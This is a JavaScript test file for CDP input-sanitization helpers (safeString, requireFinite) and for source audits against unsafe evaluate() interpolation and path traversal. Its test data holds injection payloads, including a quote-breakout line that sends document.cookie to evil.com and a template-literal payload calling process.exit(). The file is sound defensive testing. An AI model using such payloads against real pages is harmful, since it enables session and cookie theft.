/**
 * Tests for CDP input sanitization utilities and their usage across modules.
 * Covers safeString(), requireFinite(), and verifies no raw interpolation remains.
 */
import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync, readdirSync } from 'node:fs';
import { join } from 'node:path';
import { safeString, requireFinite } from '../src/connection.js';

// ── safeString() ─────────────────────────────────────────────────────────

describe('safeString() — CDP injection prevention', () => {
  it('wraps normal strings in double quotes', () => {
    assert.equal(safeString('hello'), '"hello"');
  });

  it('wraps in double quotes so single quotes are safe', () => {
    const result = safeString("test'injection");
    // JSON.stringify wraps in double quotes — single quotes inside are harmless
    assert.equal(result, '"test\'injection"');
    // The key: this produces "test'injection" which in JS is a valid double-quoted string
    // An attacker can't break out of double quotes with single quotes
  });

  it('escapes double quotes', () => {
    const result = safeString('test"injection');
    assert.equal(result, '"test\\"injection"');
  });

  it('neutralizes template literals by wrapping in double quotes', () => {
    const result = safeString('${alert(1)}');
    // JSON.stringify produces: "${alert(1)}" — a double-quoted string literal
    // Template literals only execute inside backticks, not double quotes
    const parsed = JSON.parse(result);
    assert.equal(parsed, '${alert(1)}', 'template literal preserved as literal text');
  });

  it('escapes backslashes', () => {
    const result = safeString('test\\injection');
    assert.equal(result, '"test\\\\injection"');
  });

  it('escapes newlines and control chars', () => {
    const result = safeString('line1\nline2\r\ttab');
    assert.ok(!result.includes('\n'), 'newline must be escaped');
    assert.ok(result.includes('\\n'), 'newline escaped as \\n');
  });

  it('handles empty string', () => {
    assert.equal(safeString(''), '""');
  });

  it('coerces non-strings to strings', () => {
    assert.equal(safeString(123), '"123"');
    assert.equal(safeString(null), '"null"');
    assert.equal(safeString(undefined), '"undefined"');
  });

  it('prevents the classic CDP injection payload', () => {
    const payload = "'); fetch('https://evil.com/steal?c=' + document.cookie); ('";
    const result = safeString(payload);
    // Result should be a single valid JSON string — no code breakout
    const parsed = JSON.parse(result);
    assert.equal(parsed, payload, 'payload round-trips through JSON.parse');
  });

  it('prevents template literal injection', () => {
    const payload = '`; process.exit(); `';
    const result = safeString(payload);
    const parsed = JSON.parse(result);
    assert.equal(parsed, payload);
  });
});

// ── requireFinite() ──────────────────────────────────────────────────────

describe('requireFinite() — numeric validation', () => {
  it('passes finite numbers through', () => {
    assert.equal(requireFinite(42, 'test'), 42);
    assert.equal(requireFinite(3.14, 'test'), 3.14);
    assert.equal(requireFinite(-100, 'test'), -100);
    assert.equal(requireFinite(0, 'test'), 0);
  });

  it('coerces numeric strings', () => {
    assert.equal(requireFinite('42', 'test'), 42);
    assert.equal(requireFinite('3.14', 'test'), 3.14);
  });

  it('rejects NaN', () => {
    assert.throws(() => requireFinite(NaN, 'price'), /price must be a finite number/);
  });

  it('rejects Infinity', () => {
    assert.throws(() => requireFinite(Infinity, 'time'), /time must be a finite number/);
    assert.throws(() => requireFinite(-Infinity, 'time'), /time must be a finite number/);
  });

  it('rejects non-numeric strings', () => {
    assert.throws(() => requireFinite('abc', 'value'), /value must be a finite number/);
  });

  it('coerces null to 0 (Number(null) === 0)', () => {
    assert.equal(requireFinite(null, 'x'), 0);
  });

  it('rejects undefined (Number(undefined) === NaN)', () => {
    assert.throws(() => requireFinite(undefined, 'x'), /x must be a finite number/);
  });

  it('includes the bad value in error message', () => {
    assert.throws(() => requireFinite('oops', 'field'), /got: oops/);
  });
});

// ── Source-level audit: no raw interpolation in evaluate() calls ─────────

describe('source audit — no unsafe interpolation patterns', () => {
  const CORE_DIR = new URL('../src/core/', import.meta.url).pathname;
  const coreFiles = readdirSync(CORE_DIR).filter(f => f.endsWith('.js'));

  for (const file of coreFiles) {
    it(`${file} has no .replace(/'/g, "\\\\'") patterns`, () => {
      const source = readFileSync(join(CORE_DIR, file), 'utf8');
      assert.ok(
        !source.includes(".replace(/'/g,"),
        `${file} still uses manual quote escaping — use safeString() instead`,
      );
    });
  }

  // Check that evaluate() calls with user input use safeString
  const VULNERABLE_PATTERNS = [
    // Raw string interpolation into single quotes: '${var}'
    /evaluate\([^)]*'\$\{(?!CHART_API|CWC|rp|apiPath|colPath|CHART_COLLECTION)/,
  ];

  for (const file of coreFiles) {
    it(`${file} has no raw user input in evaluate() string literals`, () => {
      const source = readFileSync(join(CORE_DIR, file), 'utf8');
      for (const pattern of VULNERABLE_PATTERNS) {
        assert.ok(
          !pattern.test(source),
          `${file} has raw interpolation in evaluate() — use safeString()`,
        );
      }
    });
  }
});

// ── Path traversal prevention ────────────────────────────────────────────

describe('path traversal prevention', () => {
  it('capture.js strips path separators from filename', () => {
    const source = readFileSync(new URL('../src/core/capture.js', import.meta.url), 'utf8');
    assert.ok(source.includes(".replace(/[\\/\\\\]/g, '_')"), 'capture.js strips path separators');
  });

  it('batch.js strips path separators from filename', () => {
    const source = readFileSync(new URL('../src/core/batch.js', import.meta.url), 'utf8');
    assert.ok(source.includes(".replace(/[\\/\\\\]/g, '_')"), 'batch.js strips path separators');
  });
});
